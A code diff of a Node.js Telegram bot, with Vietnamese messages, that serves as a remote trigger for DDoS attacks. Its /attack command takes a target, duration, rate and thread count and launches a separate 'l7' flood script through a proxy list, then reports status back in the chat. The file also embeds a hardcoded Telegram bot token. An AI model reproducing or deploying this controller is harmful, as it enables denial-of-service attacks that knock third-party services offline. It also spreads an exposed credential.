@@ -1,68 +1,58 @@
-const TelegramBot = require('node-telegram-bot-api');
-const { spawn } = require('child_process');
-const express = require('express');
+const TelegramBot = require('node-telegram-bot-api')
+const { spawn } = require('child_process')
+const express = require('express')
 
-const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc';
-const bot = new TelegramBot(TOKEN, { polling: true });
+const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc'
+const bot = new TelegramBot(TOKEN, { polling: true })
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+const app = express()
+const PORT = process.env.PORT || 3000
 
-app.get('/', (req, res) => {
-  res.send('Bot hoạt động');
-});
-
-app.listen(PORT, () => {
-  console.log(`Server chạy cổng ${PORT}`);
-});
+app.get('/', (req, res) => res.send('Bot hoạt động'))
+app.listen(PORT, () => console.log(`Cổng ${PORT}`))
 
 bot.on('message', (msg) => {
-  console.log(`Nhận: ${msg.text} từ chat ${msg.chat.id}`);
-});
+  const id = msg.chat.id
+  const text = msg.text?.trim()
+  if (!text) return
 
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, JSON.stringify({ message: "Bot khởi động. Dùng /attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' });
-});
-
-bot.onText(/^\/attack\s+(.+)/, (msg, match) => {
-  const chatId = msg.chat.id;
-  const args = match[1].split(/\s+/).filter(arg => arg);
-
-  if (args.length !== 4) {
-    bot.sendMessage(chatId, JSON.stringify({ error: "/attack [target] [time] [rate] [thread] ✅" }, null, 2), { parse_mode: 'Markdown' });
-    return;
+  if (text.startsWith('/start')) {
+    bot.sendMessage(id, JSON.stringify({ command: "/attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' })
+    return
   }
 
-  const [target, time, rate, thread] = args;
+  if (text.startsWith('/attack')) {
+    const args = text.split(/\s+/).slice(1)
+    if (args.length !== 4) {
+      bot.sendMessage(id, JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' })
+      return
+    }
 
-  if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
-    bot.sendMessage(chatId, JSON.stringify({ error: "🚫" }, null, 2), { parse_mode: 'Markdown' });
-    return;
+    const [target, time, rate, thread] = args
+    if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
+      bot.sendMessage(id, JSON.stringify({ error: "Invalid args" }, null, 2), { parse_mode: 'Markdown' })
+      return
+    }
+
+    try {
+      const cmd = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt'])
+      bot.sendMessage(id, JSON.stringify({ status: "Running", target, time, rate, thread }, null, 2), { parse_mode: 'Markdown' })
+
+      cmd.on('error', err => {
+        bot.sendMessage(id, JSON.stringify({ error: err.message }, null, 2), { parse_mode: 'Markdown' })
+      })
+
+      cmd.on('close', code => {
+        bot.sendMessage(id, JSON.stringify({ done: true, code }, null, 2), { parse_mode: 'Markdown' })
+      })
+    } catch (err) {
+      bot.sendMessage(id, JSON.stringify({ error: err.message }, null, 2), { parse_mode: 'Markdown' })
+    }
+
+    return
   }
 
-  try {
-    const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt']);
+  bot.sendMessage(id, JSON.stringify({ error: "Unknown command", usage: "/attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' })
+})
 
-    const info = { target, time: `${time}s`, rate, thread, proxy: 'proxy.txt' };
-    bot.sendMessage(chatId, JSON.stringify({ message: "📌 Attack Started!", info }, null, 2), { parse_mode: 'Markdown' });
-
-    console.log(`[ATTACK] ${target} | ${time}s | ${rate} | ${thread}`);
-
-    command.on('error', (error) => {
-      console.error(`Lỗi spawn: ${error.message}`);
-      bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
-    });
-
-    command.on('close', (code) => {
-      console.log(`Hoàn thành mã: ${code}`);
-      bot.sendMessage(chatId, JSON.stringify({ message: `ℹ️ Hoàn thành với mã: ${code}` }, null, 2), { parse_mode: 'Markdown' });
-    });
-  } catch (error) {
-    console.error(`Lỗi thực thi: ${error.message}`);
-    bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
-  }
-});
-
-bot.on('polling_error', (error) => {
-  console.error(`Lỗi polling: ${error.message}`);
-});
+bot.on('polling_error', err => console.error(err.message))
